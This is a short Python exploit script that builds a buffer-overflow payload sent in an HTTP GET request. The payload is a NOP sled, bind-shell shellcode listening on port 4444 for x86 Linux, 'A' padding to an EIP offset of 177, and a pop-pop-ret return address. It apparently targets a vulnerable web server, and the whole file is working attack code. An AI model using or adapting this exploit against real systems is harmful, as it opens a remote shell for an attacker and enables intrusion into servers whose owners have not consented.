import struct

from exploitdev.util import nops
from exploitdev.shellcode import generate

pop_pop_ret = 0x8049102

eip_offset = 177
eip = struct.pack("I", pop_pop_ret)

shellcode = generate("bind", "x86_linux", 4444)

def execute():
    prefix = "GET /"
    suffix = " HTTP/1.1\n\n"

    payload = nops(64)
    payload += shellcode.opcodes

    padding = (eip_offset - len(payload)) * "A"
    payload += padding
    
    payload += eip

    return prefix + payload + suffix
